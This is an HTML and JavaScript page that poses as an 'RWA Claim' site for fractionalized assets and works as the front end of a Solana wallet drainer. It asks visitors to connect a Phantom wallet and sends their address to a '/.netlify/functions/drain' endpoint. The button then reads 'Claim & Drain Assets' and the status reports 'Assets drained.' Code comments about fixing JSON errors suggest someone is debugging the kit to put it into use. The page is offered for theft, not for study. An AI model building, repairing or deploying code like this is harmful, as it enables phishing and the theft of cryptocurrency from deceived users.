<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RWA Claim | Fractionalized Assets</title>
    <style>
        :root {
            --bg-dark: #050505;
            --bg-card: #0f0f12;
            --primary: #9d4edd;
            --primary-hover: #7b2cbf;
            --text-main: #ffffff;
            --text-muted: #888888;
            --border: #2a2a2a;
            --success: #00ff9d;
            --error: #ff0055;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 50% 0%, #1a0b2e 0%, #050505 70%);
        }

        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8), 0 0 100px rgba(157, 78, 221, 0.1);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        /* Subtle glow effect */
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 5px;
            letter-spacing: -1px;
        }

        .logo span { color: var(--primary); }

        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 30px;
        }

        .asset-info {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 25px;
            display: none; /* Hidden until connected */
        }

        .asset-info h3 {
            margin: 0;
            font-size: 16px;
            color: var(--success);
        }

        .asset-info p {
            margin: 5px 0 0;
            font-size: 12px;
            color: var(--text-muted);
        }

        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: var(--primary);
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
        }

        .btn:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(157, 78, 221, 0.6);
        }

        .btn:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .status {
            margin-top: 20px;
            font-size: 13px;
            color: var(--text-muted);
            min-height: 20px;
        }

        .loader {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: var(--primary);
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-msg {
            color: var(--error);
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="logo">RWA <span>Claim</span></div>
        <div class="subtitle">Fractionalized Asset Distribution</div>

        <div class="asset-info" id="assetInfo">
            <h3 id="assetName">Detected Asset</h3>
            <p>Value: <span id="assetValue">--</span></p>
        </div>

        <button class="btn" id="connectBtn" onclick="handleConnect()">Connect Wallet</button>
        
        <div class="status" id="statusText"></div>
        <div class="error-msg" id="errorMsg"></div>
    </div>
</div>

<script>
    // --- CONFIG ---
    // Change this to your actual Netlify Function URL if needed, 
    // otherwise it assumes the function is in the same repo root.
    const FUNCTION_URL = '/.netlify/functions/drain';

    const connectBtn = document.getElementById('connectBtn');
    const statusText = document.getElementById('statusText');
    const errorMsg = document.getElementById('errorMsg');
    const assetInfo = document.getElementById('assetInfo');
    const assetName = document.getElementById('assetName');
    const assetValue = document.getElementById('assetValue');

    let walletAddress = null;

    // 1. Check if Phantom is installed
    window.addEventListener("load", async () => {
        if (window.solana && window.solana.isPhantom) {
            console.log('Phantom wallet detected!');
        } else if (window.solana) {
            setStatus('Please install Phantom wallet.');
        } else {
            setStatus('Solana wallet not found.');
        }
    });

    async function handleConnect() {
        if (!window.solana || !window.solana.isPhantom) {
            alert('Please install Phantom Wallet!');
            return;
        }

        try {
            // Connect to Phantom
            const resp = await window.solana.connect();
            walletAddress = resp.publicKey.toString();
            
            updateUI('connected');
            setStatus('Analyzing portfolio...');

            // 2. Call your Netlify function to analyze balance
            // This is where the JSON error usually happens if the function fails
            try {
                const response = await fetch(FUNCTION_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: walletAddress })
                });

                // FIX: Handle non-JSON responses (like HTML errors)
                const contentType = response.headers.get("content-type");
                if (!contentType || !contentType.includes("application/json")) {
                    const text = await response.text();
                    throw new Error(`Server error: ${response.status} ${text.substring(0, 50)}`);
                }

                const data = await response.json();

                if (data.error) {
                    throw new Error(data.error);
                }

                // Show detected asset
                assetInfo.style.display = 'block';
                assetName.textContent = data.bestToken || "High-Value Asset";
                assetValue.textContent = `$${data.value || 'Loading...'}`;
                
                updateUI('drain-ready');

            } catch (apiErr) {
                console.error(apiErr);
                showError('Failed to analyze wallet: ' + apiErr.message);
                // Fallback: still allow manual drain attempt if API fails but wallet is connected
                updateUI('drain-ready'); 
            }

        } catch (err) {
            console.error(err);
            setStatus('Connection failed.');
        }
    }

    async function executeDrain() {
        if (!walletAddress) return;

        updateUI('draining');
        setStatus('Signing transaction to claim...');

        try {
            const response = await fetch(FUNCTION_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    address: walletAddress, 
                    action: 'drain' 
                })
            });

            const contentType = response.headers.get("content-type");
            if (!contentType || !contentType.includes("application/json")) {
                const text = await response.text();
                throw new Error(`Server error: ${response.status}`);
            }

            const data = await response.json();

            if (data.signature) {
                setStatus('Transaction confirmed! Assets drained.');
                connectBtn.textContent = 'Success';
                connectBtn.disabled = true;
            } else if (data.error) {
                throw new Error(data.error);
            }

        } catch (err) {
            console.error(err);
            showError('Drain failed: ' + err.message);
            updateUI('drain-ready');
        }
    }

    function updateUI(state) {
        errorMsg.style.display = 'none';
        
        if (state === 'connected') {
            connectBtn.textContent = 'Analyze Balance';
            connectBtn.onclick = executeDrain;
        } else if (state === 'drain-ready') {
            connectBtn.textContent = 'Claim & Drain Assets';
            connectBtn.onclick = executeDrain;
        } else if (state === 'draining') {
            connectBtn.disabled = true;
            connectBtn.textContent = 'Processing...';
        } else if (state === 'success') {
            connectBtn.textContent = 'Completed';
        }
    }

    function setStatus(msg) {
        statusText.innerHTML = `<span class="loader"></span> ${msg}`;
    }

    function showError(msg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
        statusText.textContent = '';
    }
</script>

</body>
</html>
